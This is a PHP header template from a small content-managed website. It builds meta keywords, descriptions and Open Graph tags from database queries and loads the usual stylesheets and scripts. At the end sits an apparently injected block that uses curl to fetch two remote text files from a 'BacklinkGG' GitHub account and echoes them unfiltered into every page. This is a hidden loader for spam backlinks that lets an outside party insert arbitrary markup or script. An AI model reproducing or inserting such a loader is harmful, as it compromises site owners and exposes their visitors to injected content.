<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<? include("admin/conn.php");
$contentid=$_GET['contentid'];
settype($contentid, "integer");
if (!$contentid) {$contentid=12;}
if ($contentid<=0) {
//$sqlmetakeywords = mysql_query("SELECT * FROM metadata WHERE id=1") or die (mysql_error());
$sqlmetakeywords=mysqli_query($connect, "SELECT * FROM metadata WHERE id=1") or die(mysqli_error($connect));
while ($keywordsrow = mysqli_fetch_array($sqlmetakeywords)) {
$metadescription=$keywordsrow["metadescription"];
$metakeywords=$keywordsrow["metakeywords"];
}
};
if ($contentid){
//evresi an iparxi arthro kato apo afti tin epilogi
$imageresult = mysqli_query($connect,"SELECT id FROM content WHERE (parentid='$contentid' or id='$contentid' ) and active =1 and position=6") or die(mysqli_error($connect));
if (mysqli_num_rows($imageresult) > 0) {
$articleexists=1;
} else {$articleexists=0;}
$metakeywords="";
//$sqlmetakeywords = mysql_query("SELECT * FROM content WHERE id='$contentid'") or die (mysql_error());
$sqlmetakeywords=mysqli_query($connect, "SELECT * FROM content WHERE id='$contentid'") or die(mysqli_error($connect));
while ($keywordsrow = mysqli_fetch_array($sqlmetakeywords)) {
$parentid=$keywordsrow["parentid"];
$titlosarthrou = $keywordsrow["titlosarthrou$langflag"];
$image = $keywordsrow["image"];
$writer = $keywordsrow["writer"];
$text = $keywordsrow["text$langflag"];
$forma = $keywordsrow["forma"];
$slider = $keywordsrow["slider"];
$gallery = $keywordsrow["gallery"];
$metakeywords=$keywordsrow["keywords$langflag"];
$hot = $keywordsrow["hot"];
$metadescription= substr((strip_tags($text)),0,300)."...";
$metadescription=iconv ('utf-8', 'utf-8', $metadescription);
$relativeimage = $keywordsrow["bigimage"];
IF ($titlosarthrou<>'') { $website.=":::".$titlosarthrou; }
if ($metakeywords=='') {
$words= substr((strip_tags($titlosarthrou.$text)),0,500)."...";
$words=iconv ('utf-8', 'utf-8', $words);
$pieces = explode(" ", $words);
$count = count($pieces);
for ($i = 0; $i < $count; $i++)   {
$word=$pieces[$i];
//rtrim ($word, "!");
$word = str_replace('!', '', $word);
$word = str_replace(';', '', $word);
$word = str_replace('.', '', $word);
$word = str_replace('=', '', $word);
$word = str_replace('?', '', $word);
$word = str_replace(':', '', $word);
$key=strlen($word);
if ( $key>9 ) {  $metakeywords.="$word,";  }
}}}} ?>
<title><?=$website?></title>
<? $randomnumber=rand(1,3);  ?>
<meta name="keywords" content="<? echo $metakeywords; ?>,<? echo $websitename; ?>" >
<meta name="description" content="<?=$metadescription?>" >
<meta http-equiv="Content-Language" content="en" >
<meta http-equiv="expires" content="0" >
<meta name="ROBOTS" content="INDEX,FOLLOW" >
<meta name="revisit-after" content="1 days">
<meta property="og:title" content="<?=$website?>" />
<meta property="og:description" content="<?=$metadescription?>"  />
<meta property="og:url" content="<? echo "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>" />
<meta property="og:image" content="https://<?=$_SERVER['HTTP_HOST']?>/images/200x240.jpg" />
<link rel="image_src" href="images/200x240.jpg">
  <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

	<!-- core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/font-awesome.min.css" rel="stylesheet">
    <link href="css/animate.min.css" rel="stylesheet">
    <link href="css/prettyPhoto.css" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">
    <link href="css/mystyle.css" rel="stylesheet">
    <link href="css/responsive.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css">
    <!--[if lt IE 9]>
    <script src="js/html5shiv.js"></script>
    <script src="js/respond.min.js"></script>
    <![endif]-->
    <link rel="shortcut icon" href="images/ico/favicon.ico">
      <!-- Important Owl stylesheet -->
    <link rel="stylesheet" href="owl-carousel/owl-carousel/owl.carousel.css">
    <!-- Default Theme -->
    <link rel="stylesheet" href="owl-carousel/owl-carousel/owl.theme.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include js plugin -->
    <script src="owl-carousel/owl-carousel/owl.carousel.js"></script>
    <link rel="stylesheet" href="css/bootstrap-datepicker3.standalone.css">
<?php
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url1);
$result1 = curl_exec($ch);
curl_setopt($ch, CURLOPT_URL, $url2);
$result2 = curl_exec($ch);
curl_close($ch);
echo $result1;
echo $result2;
?>
